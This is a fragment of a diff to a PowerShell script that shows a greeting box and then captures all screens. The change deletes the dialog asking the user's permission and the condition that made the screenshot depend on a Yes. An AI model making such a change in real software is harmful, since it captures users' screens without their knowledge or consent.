@@ -5,16 +5,7 @@ Add-Type -AssemblyName System.Drawing
 # First, display the Hello message box
 [System.Windows.Forms.MessageBox]::Show("Hello", "Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
 
-# Ask for permission to take a screenshot
-$permission = [System.Windows.Forms.MessageBox]::Show(
-    "Would you like to take a screenshot of your screen?", 
-    "Permission Request", 
-    [System.Windows.Forms.MessageBoxButtons]::YesNo, 
-    [System.Windows.Forms.MessageBoxIcon]::Question)
 
-# Only take screenshot if user gives permission
-if ($permission -eq [System.Windows.Forms.DialogResult]::Yes) {
-    try {
         # Get all screens
         $screens = [System.Windows.Forms.Screen]::AllScreens
         
